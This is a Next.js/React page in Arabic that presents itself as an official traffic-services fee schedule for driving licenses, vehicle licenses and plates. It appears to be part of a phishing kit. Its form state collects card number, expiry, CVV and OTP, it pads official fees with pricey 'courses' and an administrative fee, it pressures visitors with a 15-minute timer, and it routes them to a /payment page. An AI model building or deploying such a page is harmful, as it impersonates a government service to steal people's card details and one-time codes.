"use client"

import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Label } from "@/components/ui/label"
import { useState } from "react"
import { Badge } from "@/components/ui/badge"
import { Clock } from "lucide-react"
import { Separator } from "@/components/ui/separator"
import { CheckCircle2 } from "lucide-react"
import { redirect } from "next/dist/server/api-utils"

export default function DrivingFeesPage() {
  const [formData, setFormData] = useState({
    name: "",
    phone: "",
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: "",
    otp: "",
    licenseType: "",
  })

  const handleInputChange = (key: string, value: string) => {
    setFormData({ ...formData, [key]: value })
  }

  const getLicensePrice = (licenseType: string) => {
    const prices: { [key: string]: number } = {
      "private-40": 40,
      "public-40": 40,
      "commercial-100": 100,
      "motorcycle-20": 20,
      "temporary-100": 100,
      "car-basic-599": 599,
      "car-standard-799": 799,
      "car-premium-999": 999,
      "motorcycle-basic-499": 499,
      "truck-commercial-1999": 1999,
      "defensive-299": 299,
      "refresher-349": 349,
    }
    return prices[licenseType] || 0
  }

  const getLicenseName = (licenseType: string) => {
    const names: { [key: string]: string } = {
      "private-40": "رخصة قيادة خاصة",
      "public-40": "رخصة قيادة عامة",
      "commercial-100": "رخصة قيادة مركبات أشغال عامة",
      "motorcycle-20": "رخصة قيادة دراجة آلية",
      "temporary-100": "تصريح قيادة مؤقت",
      "car-basic-599": "دورة السيارة الأساسية",
      "car-standard-799": "دورة السيارة القياسية",
      "car-premium-999": "دورة السيارة المميزة",
      "motorcycle-basic-499": "دورة الدراجة النارية الأساسية",
      "truck-commercial-1999": "دورة الشاحنة التجارية",
      "defensive-299": "دورة القيادة الدفاعية",
      "refresher-349": "دورة تنشيطية",
    }
    return names[licenseType] || "غير محدد"
  }

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      {/* Page Header */}
      <div className="bg-green-800 text-white py-8 md:py-12">
        <div className="container mx-auto px-4 text-center">
          <h1 className="text-xl md:text-3xl font-bold mb-2 md:mb-4">جدول رسوم الخدمات المرورية</h1>
          <p className="text-sm md:text-base max-w-2xl mx-auto">
            رسوم رخص القيادة ونقل ملكية المركبات ولوحات المركبات بأنواعها
          </p>
        </div>
      </div>

      {/* Register Button Section */}
      <div className="container mx-auto px-4 py-6 md:py-8">
        <div className="text-center">
          <div className="bg-white rounded-lg shadow-lg p-4 md:p-8 max-w-2xl mx-auto">
            <h2 className="text-lg md:text-2xl font-bold mb-3 md:mb-4 text-gray-800">ابدأ إجراءاتك الآن</h2>
            <p className="text-sm md:text-base text-gray-600 mb-4 md:mb-6">
              سجل الآن للحصول على رخصة القيادة أو تجديد رخصة المركبة بسهولة ويسر
            </p>
            <div className="flex flex-col gap-3 md:gap-4 justify-center">
              <Button className="bg-green-700 hover:bg-green-800 text-white px-4 md:px-8 py-2 md:py-3 text-sm md:text-lg w-full md:w-auto">
                تسجيل رخصة قيادة جديدة
              </Button>
              <Button
                variant="outline"
                className="border-green-700 text-green-700 hover:bg-green-50 px-4 md:px-8 py-2 md:py-3 text-sm md:text-lg bg-transparent w-full md:w-auto"
              >
                تجديد الرخصة الحالية
              </Button>
            </div>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-6 md:py-12 space-y-6 md:space-y-8">
        {/* Vehicle License and Transfer Fees */}
        <Card className="mx-4 md:mx-0">
          <CardHeader className="p-4 md:p-6">
            <CardTitle className="text-lg md:text-xl font-bold text-center">
              جدول رسوم رخص سير ونقل ملكية المركبات بأنواعها
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="overflow-x-auto -mx-4 md:mx-0">
              <div className="min-w-full inline-block align-middle">
                <div className="overflow-hidden">
                  <table className="min-w-full border-collapse border border-gray-300">
                    <thead>
                      <tr className="bg-green-600 text-white">
                        <th className="border border-gray-300 p-2 md:p-3 text-center text-xs md:text-sm">م</th>
                        <th className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">النوع</th>
                        <th className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">رسم الرخصة السنوي</th>
                        <th className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">رسم التجديد السنوي</th>
                        <th className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">رسم البالغ والمفقود</th>
                        <th className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">رسم نقل الملكية</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr className="bg-gray-100">
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm text-center">1</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">رخصة سير خاصة</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">100 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">100 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">100 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">150 ريال</td>
                      </tr>
                      <tr>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm text-center">2</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">رخصة سير نقل خاص</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">200 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">200 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">100 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">150 ريال</td>
                      </tr>
                      <tr className="bg-gray-100">
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm text-center">3</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">رخصة سير حافلة صغيرة</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">200 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">200 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">100 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">150 ريال</td>
                      </tr>
                      <tr>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm text-center">4</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">رخصة سير سيارة أجرة</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">200 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">200 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">100 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">300 ريال</td>
                      </tr>
                      <tr className="bg-gray-100">
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm text-center">5</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">رخصة سير نقل عام</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">400 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">400 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">100 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">300 ريال</td>
                      </tr>
                      <tr>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm text-center">6</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">رخصة سير حافلة عامة</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">400 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">400 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">100 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">300 ريال</td>
                      </tr>
                      <tr className="bg-gray-100">
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm text-center">7</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">رخصة سير دراجة آلية</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">100 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">100 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">100 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">150 ريال</td>
                      </tr>
                      <tr>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm text-center">8</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">
                          رخصة سير مركبة أشغال عامة
                        </td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">300 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">300 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">100 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">300 ريال</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Driving License Fees */}
        <Card className="mx-4 md:mx-0">
          <CardHeader className="p-4 md:p-6">
            <CardTitle className="text-lg md:text-xl font-bold text-center">جدول رسوم رخص القيادة بأنواعها</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="overflow-x-auto -mx-4 md:mx-0">
              <div className="min-w-full inline-block align-middle">
                <div className="overflow-hidden">
                  <table className="min-w-full border-collapse border border-gray-300">
                    <thead>
                      <tr className="bg-green-600 text-white">
                        <th className="border border-gray-300 p-2 md:p-3 text-center text-xs md:text-sm">م</th>
                        <th className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">فئة الرخصة</th>
                        <th className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">رسوم الرخصة السنوي</th>
                        <th className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">رسم التجديد السنوي</th>
                        <th className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">رسم البالغ والمفقود</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr className="bg-gray-100">
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm text-center">1</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">رخصة قيادة خاصة</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">40 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">40 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">100 ريال</td>
                      </tr>
                      <tr>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm text-center">2</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">رخصة قيادة عامة</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">40 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">40 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">100 ريال</td>
                      </tr>
                      <tr className="bg-gray-100">
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm text-center">3</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">
                          رخصة قيادة مركبات أشغال عامة
                        </td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">100 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">100 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">100 ريال</td>
                      </tr>
                      <tr>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm text-center">4</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">رخصة قيادة دراجة آلية</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">20 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">20 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">100 ريال</td>
                      </tr>
                      <tr className="bg-gray-100">
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm text-center">5</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">تصريح قيادة مؤقت</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">100 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">--</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">100 ريال</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Vehicle Plates Fees */}
        <Card className="mx-4 md:mx-0">
          <CardHeader className="p-4 md:p-6">
            <CardTitle className="text-lg md:text-xl font-bold text-center">
              جدول رسوم لوحات المركبات بأنواعها
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="overflow-x-auto -mx-4 md:mx-0">
              <div className="min-w-full inline-block align-middle">
                <div className="overflow-hidden">
                  <table className="min-w-full border-collapse border border-gray-300">
                    <thead>
                      <tr className="bg-green-600 text-white">
                        <th className="border border-gray-300 p-2 md:p-3 text-center text-xs md:text-sm">م</th>
                        <th className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">النوع</th>
                        <th className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">رسوم الرخصة السنوي</th>
                        <th className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">رسم التجديد السنوي</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr className="bg-gray-100">
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm text-center">1</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">لوحة عادية</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">50 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">50 ريال</td>
                      </tr>
                      <tr>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm text-center">2</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">لوحة مميزة</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">200 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">200 ريال</td>
                      </tr>
                      <tr className="bg-gray-100">
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm text-center">3</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">لوحة خاصة</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">500 ريال</td>
                        <td className="border border-gray-300 p-2 md:p-3 text-xs md:text-sm">500 ريال</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* License Type Selection */}
        <div className="container mx-auto px-4 py-6 md:py-8">
          <div className="bg-white rounded-lg shadow-lg p-4 md:p-6 max-w-4xl mx-auto">
            <div className="space-y-4 md:space-y-6">
              <h3 className="text-base md:text-lg font-semibold text-slate-700 border-r-2 border-blue-500 pr-3">
                نوع الرخصة المطلوبة
              </h3>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 md:gap-6">
                <div className="space-y-2">
                  <Label htmlFor="licenseType" className="text-sm font-medium text-slate-700">
                    اختر نوع الرخصة *
                  </Label>
                  <Select onValueChange={(value) => handleInputChange("licenseType", value)} required>
                    <SelectTrigger className="h-10 md:h-12 border-slate-200 focus:border-blue-500">
                      <SelectValue placeholder="اختر نوع الرخصة" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="private-40">رخصة قيادة خاصة - 40 ريال</SelectItem>
                      <SelectItem value="public-40">رخصة قيادة عامة - 40 ريال</SelectItem>
                      <SelectItem value="commercial-100">رخصة قيادة مركبات أشغال عامة - 100 ريال</SelectItem>
                      <SelectItem value="motorcycle-20">رخصة قيادة دراجة آلية - 20 ريال</SelectItem>
                      <SelectItem value="temporary-100">تصريح قيادة مؤقت - 100 ريال</SelectItem>
                      <SelectItem value="car-basic-599">دورة السيارة الأساسية - 599 ريال</SelectItem>
                      <SelectItem value="car-standard-799">دورة السيارة القياسية - 799 ريال</SelectItem>
                      <SelectItem value="car-premium-999">دورة السيارة المميزة - 999 ريال</SelectItem>
                      <SelectItem value="motorcycle-basic-499">دورة الدراجة النارية الأساسية - 499 ريال</SelectItem>
                      <SelectItem value="truck-commercial-1999">دورة الشاحنة التجارية - 1999 ريال</SelectItem>
                      <SelectItem value="defensive-299">دورة القيادة الدفاعية - 299 ريال</SelectItem>
                      <SelectItem value="refresher-349">دورة تنشيطية - 349 ريال</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                {/* Payment Summary */}
                <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-4 md:p-6 rounded-xl border border-blue-100">
                  <div className="flex items-center justify-between mb-3 md:mb-4">
                    <span className="text-sm font-medium text-slate-600">ملخص الدفع</span>
                    <Badge variant="outline" className="text-xs">
                      <Clock className="h-3 w-3 ml-1" />
                      صالح لمدة 15 دقيقة
                    </Badge>
                  </div>
                  <div className="space-y-2">
                    {formData.licenseType && (
                      <div className="flex justify-between text-xs md:text-sm">
                        <span className="text-slate-600 truncate ml-2">{getLicenseName(formData.licenseType)}</span>
                        <span className="text-slate-900 font-medium">{getLicensePrice(formData.licenseType)} ريال</span>
                      </div>
                    )}
                    <div className="flex justify-between text-xs md:text-sm">
                      <span className="text-slate-600">رسوم إدارية</span>
                      <span className="text-slate-900">50 ريال</span>
                    </div>
                    <Separator className="my-2" />
                    <div className="flex justify-between items-center">
                      <span className="font-semibold text-slate-900 text-sm md:text-base">المبلغ الإجمالي</span>
                      <span className="text-lg md:text-2xl font-bold text-blue-600">
                        {formData.licenseType ? getLicensePrice(formData.licenseType) + 50 : 50} ريال
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

      
        <Button className="w-full bg-green-800" onClick={()=>window.location.href="/payment"}>
دفع الرسوم
</Button>
        {/* Footer Note */}
        <div className="text-center text-gray-600 text-sm">
          <p>* الرسوم المذكورة أعلاه قابلة للتغيير حسب اللوائح الحكومية</p>
          <p>* يرجى مراجعة الجهات المختصة للحصول على أحدث المعلومات</p>
        </div>
       
      </div>
    </div>
  )
}
